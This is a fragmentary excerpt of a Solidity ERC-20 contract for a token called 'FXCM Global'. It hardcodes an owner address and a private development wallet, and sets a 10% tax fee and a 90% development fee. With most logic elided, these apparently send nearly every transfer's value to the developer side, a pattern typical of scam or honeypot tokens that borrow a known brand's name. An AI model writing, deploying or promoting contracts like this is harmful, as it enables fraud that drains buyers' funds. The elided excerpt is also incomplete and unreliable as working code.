...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xc47F741D60cb5D99659d6423DFB2f139D61E3D4d;
...
contract FXCMGLOBAL is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0xb622dBeFd27eD1747da334f8e39beDc422e41D39;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 50000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "FXCM Global";
    string private _symbol = "FXCM";
    uint8 private _decimals = 18;
    uint256 public _taxFee = 10;
    uint256 private _previousTaxFee = _taxFee;
    uint256 public _developmentFee = 90;
    ...
    uint256 public _maxTxAmount = 40000 * 10**18;
    ...
    constructor () {
        ...
        emit Transfer(address(3000), owner(), _tTotal);
    }
